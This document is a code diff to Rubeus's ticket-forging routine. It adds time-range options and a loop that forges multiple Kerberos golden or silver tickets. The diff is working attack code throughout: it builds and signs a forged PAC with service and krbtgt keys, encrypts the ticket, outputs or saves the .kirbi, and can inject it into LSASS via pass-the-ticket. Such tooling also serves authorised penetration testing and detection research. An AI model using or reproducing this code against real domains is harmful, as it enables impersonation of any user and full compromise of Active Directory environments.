@@ -3,6 +3,7 @@ using System.Text;
 using System.Security.Principal;
 using System.Collections.Generic;
 using System.Linq;
+using System.Globalization;
 using System.DirectoryServices;
 using Rubeus.lib.Interop;
 using Rubeus.Kerberos.PAC;
@@ -12,7 +13,7 @@ namespace Rubeus
 {
     public class ForgeTickets
     {
-        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256, bool ldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
+        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, byte[] krbKey = null, Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256, bool ldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 0, string groups = "", string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent, DateTime? startTime = null, DateTime? rangeEnd = null, string rangeInterval = "1d", DateTime? authTime = null, string endTime = "", string renewTill = "")
         {
             // vars
             int c = 0;
@@ -366,19 +367,13 @@ namespace Rubeus
                     kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                 }
             }
-            LogonInfo li = new LogonInfo(kvi);
 
-
-            ClientName cn = new ClientName(DateTime.UtcNow, user);
+            // generate a random session key, encryption type and checksum types
+            Random random = new Random();
+            byte[] randKeyBytes;
             SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
             SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
             int svrSigLength = 12, kdcSigLength = 12;
-
-            UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
-
-            // generate a random session key
-            Random random = new Random();
-            byte[] randKeyBytes;
             if (etype == Interop.KERB_ETYPE.rc4_hmac)
             {
                 randKeyBytes = new byte[16];
@@ -415,118 +410,14 @@ namespace Rubeus
                 }
             }
 
-            Console.WriteLine("[*] Generating EncTicketPart");
-            EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);
-
-            // generate clear signatures
-            Console.WriteLine("[*] Signing PAC");
-            svrSigData.Signature = new byte[svrSigLength];
-            kdcSigData.Signature = new byte[kdcSigLength];
-            Array.Clear(svrSigData.Signature, 0, svrSigLength);
-            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
-
             // set krbKey to serviceKey if none is given
             if (krbKey == null)
             {
                 krbKey = serviceKey;
             }
 
-            // add sections to the PAC, get bytes and generate checksums
-            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
-            PacInfoBuffers.Add(li);
-            PacInfoBuffers.Add(cn);
-            PacInfoBuffers.Add(upnDns);
-            PacInfoBuffers.Add(svrSigData);
-            PacInfoBuffers.Add(kdcSigData);
-            PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
-            byte[] ptBytes = pt.Encode();
-            byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
-            byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
-
-            // add checksums
-            svrSigData.Signature = svrSig;
-            kdcSigData.Signature = kdcSig;
-            PacInfoBuffers = new List<PacInfoBuffer>();
-            PacInfoBuffers.Add(li);
-            PacInfoBuffers.Add(cn);
-            PacInfoBuffers.Add(upnDns);
-            PacInfoBuffers.Add(svrSigData);
-            PacInfoBuffers.Add(kdcSigData);
-            pt = new PACTYPE(0, PacInfoBuffers);
-
-            // add the PAC to the ticket
-            decTicketPart.SetPac(pt);
-
-
-            // encrypt the EncTicketPart
-            Console.WriteLine("[*] Encrypting EncTicketPart");
-            byte[] encTicketData = decTicketPart.Encode().Encode();
-            byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
-
-            // initialize the ticket and add the enc_part
-            Console.WriteLine("[*] Generating Ticket");
-            Ticket ticket = new Ticket(domain.ToUpper(), sname);
-            ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
-
-            // add the ticket
-            cred.tickets.Add(ticket);
-
-            // [0] add in the session key
-            info.key.keytype = (int)etype;
-            info.key.keyvalue = randKeyBytes;
-
-            // [1] prealm (domain)
-            info.prealm = decTicketPart.crealm;
-
-            // [2] pname (user)
-            info.pname.name_type = decTicketPart.cname.name_type;
-            info.pname.name_string = decTicketPart.cname.name_string;
-
-            // [3] flags
-            info.flags = flags;
-
-            // [4] authtime (not required)
-            info.authtime = decTicketPart.authtime;
-
-            // [5] starttime
-            info.starttime = decTicketPart.starttime;
-
-            // [6] endtime
-            info.endtime = decTicketPart.endtime;
-
-            // [7] renew-till
-            info.renew_till = decTicketPart.renew_till;
-
-            // [8] srealm
-            info.srealm = ticket.realm;
-
-            // [9] sname
-            info.sname.name_type = ticket.sname.name_type;
-            info.sname.name_string = ticket.sname.name_string;
-
-            // add the ticket_info into the cred object
-            cred.enc_part.ticket_info.Add(info);
-
-            Console.WriteLine("[*] Generated KERB-CRED");
-
-
-
-            byte[] kirbiBytes = cred.Encode().Encode();
-
-            string kirbiString = Convert.ToBase64String(kirbiBytes);
-
-            if (parts[0] == "krbtgt")
-            {
-                Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
-            }
-            else
-            {
-                Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
-            }
-            Console.WriteLine("");
-
-            // output some ticket information
-            Console.WriteLine("[*] Domain         : {0} ({1})", ticket.realm, kvi.LogonDomainName);
+            // output some ticket information relevent to all tickets generated
+            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);
             Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
             Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
             Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
@@ -540,46 +431,197 @@ namespace Rubeus
             Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);
             Console.WriteLine("[*] Service        : {0}", parts[0]);
             Console.WriteLine("[*] Target         : {0}", parts[1]);
-            var dateFormat = "dd/MM/yyyy HH:mm:ss";
-            Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(dateFormat));
-            Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(dateFormat));
-            Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(dateFormat));
-            Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(dateFormat));
-
             Console.WriteLine("");
 
-            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
-
-            if (Program.wrapTickets)
+            // loop incase we need to generate multiple tickets as everything below this are effected
+            do
             {
-                // display the .kirbi base64, columns of 80 chararacters
-                foreach (string line in Helpers.Split(kirbiString, 80))
+                kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
+                LogonInfo li = new LogonInfo(kvi);
+
+
+                ClientName cn = new ClientName((DateTime)startTime, user);
+
+                UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+
+                Console.WriteLine("[*] Generating EncTicketPart");
+                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), user, flags, cn.ClientId);
+
+                // set other times in EncTicketPart
+                DateTime? check = null;
+                decTicketPart.authtime = (DateTime)authTime;
+                if (!String.IsNullOrEmpty(endTime))
                 {
-                    Console.WriteLine("      {0}", line);
+                    check = Helpers.FurtureDate((DateTime)startTime, endTime);
+                    if (check != null)
+                    {
+                        decTicketPart.endtime = (DateTime)check;
+                    }
                 }
-            }
-            else
-            {
-                Console.WriteLine("      {0}", kirbiString);
-            }
-
-            Console.WriteLine("");
-
-            if (!String.IsNullOrEmpty(outfile))
-            {
-                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
-                filename = Helpers.MakeValidFileName(filename);
-                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                if (!String.IsNullOrEmpty(renewTill))
                 {
-                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                    check = Helpers.FurtureDate((DateTime)startTime, renewTill);
+                    if (check != null)
+                    {
+                        decTicketPart.renew_till = (DateTime)check;
+                    }
                 }
-            }
 
-            if (ptt)
-            {
-                // pass-the-ticket -> import into LSASS
-                LSA.ImportTicket(kirbiBytes, new LUID());
-            }
+                // generate clear signatures
+                Console.WriteLine("[*] Signing PAC");
+                svrSigData.Signature = new byte[svrSigLength];
+                kdcSigData.Signature = new byte[kdcSigLength];
+                Array.Clear(svrSigData.Signature, 0, svrSigLength);
+                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
+
+                // add sections to the PAC, get bytes and generate checksums
+                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
+                PacInfoBuffers.Add(li);
+                PacInfoBuffers.Add(cn);
+                PacInfoBuffers.Add(upnDns);
+                PacInfoBuffers.Add(svrSigData);
+                PacInfoBuffers.Add(kdcSigData);
+                PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
+                byte[] ptBytes = pt.Encode();
+                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
+                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
+
+                // add checksums
+                svrSigData.Signature = svrSig;
+                kdcSigData.Signature = kdcSig;
+                PacInfoBuffers = new List<PacInfoBuffer>();
+                PacInfoBuffers.Add(li);
+                PacInfoBuffers.Add(cn);
+                PacInfoBuffers.Add(upnDns);
+                PacInfoBuffers.Add(svrSigData);
+                PacInfoBuffers.Add(kdcSigData);
+                pt = new PACTYPE(0, PacInfoBuffers);
+
+                // add the PAC to the ticket
+                decTicketPart.SetPac(pt);
+
+
+                // encrypt the EncTicketPart
+                Console.WriteLine("[*] Encrypting EncTicketPart");
+                byte[] encTicketData = decTicketPart.Encode().Encode();
+                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
+
+                // initialize the ticket and add the enc_part
+                Console.WriteLine("[*] Generating Ticket");
+                Ticket ticket = new Ticket(domain.ToUpper(), sname);
+                ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
+
+                // add the ticket
+                cred.tickets.Add(ticket);
+
+                // [0] add in the session key
+                info.key.keytype = (int)etype;
+                info.key.keyvalue = randKeyBytes;
+
+                // [1] prealm (domain)
+                info.prealm = decTicketPart.crealm;
+
+                // [2] pname (user)
+                info.pname.name_type = decTicketPart.cname.name_type;
+                info.pname.name_string = decTicketPart.cname.name_string;
+
+                // [3] flags
+                info.flags = flags;
+
+                // [4] authtime (not required)
+                info.authtime = decTicketPart.authtime;
+
+                // [5] starttime
+                info.starttime = decTicketPart.starttime;
+
+                // [6] endtime
+                info.endtime = decTicketPart.endtime;
+
+                // [7] renew-till
+                info.renew_till = decTicketPart.renew_till;
+
+                // [8] srealm
+                info.srealm = ticket.realm;
+
+                // [9] sname
+                info.sname.name_type = ticket.sname.name_type;
+                info.sname.name_string = ticket.sname.name_string;
+
+                // add the ticket_info into the cred object
+                cred.enc_part.ticket_info.Add(info);
+
+                Console.WriteLine("[*] Generated KERB-CRED");
+
+
+
+                byte[] kirbiBytes = cred.Encode().Encode();
+
+                string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+                if (parts[0] == "krbtgt")
+                {
+                    Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
+                }
+                else
+                {
+                    Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
+                }
+                Console.WriteLine("");
+
+                // dates unique to this ticket
+                Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
+                Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
+                Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));
+                Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));
+
+                Console.WriteLine("");
+
+                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
+
+                if (Program.wrapTickets)
+                {
+                    // display the .kirbi base64, columns of 80 chararacters
+                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    {
+                        Console.WriteLine("      {0}", line);
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("      {0}", kirbiString);
+                }
+
+                Console.WriteLine("");
+
+                if (!String.IsNullOrEmpty(outfile))
+                {
+                    DateTime fileTime = (DateTime)startTime;
+                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                    filename = Helpers.MakeValidFileName(filename);
+                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                    {
+                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                    }
+                }
+
+                Console.WriteLine("");
+
+                if (ptt)
+                {
+                    // pass-the-ticket -> import into LSASS
+                    LSA.ImportTicket(kirbiBytes, new LUID());
+                }
+
+                // increase startTime by rangeInterval
+                startTime = Helpers.FurtureDate((DateTime)startTime, rangeInterval);
+                if (startTime == null)
+                {
+                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", rangeInterval);
+                    startTime = rangeEnd;
+                }
+                authTime = startTime;
+
+            } while (startTime < rangeEnd);
         }
     }
 }
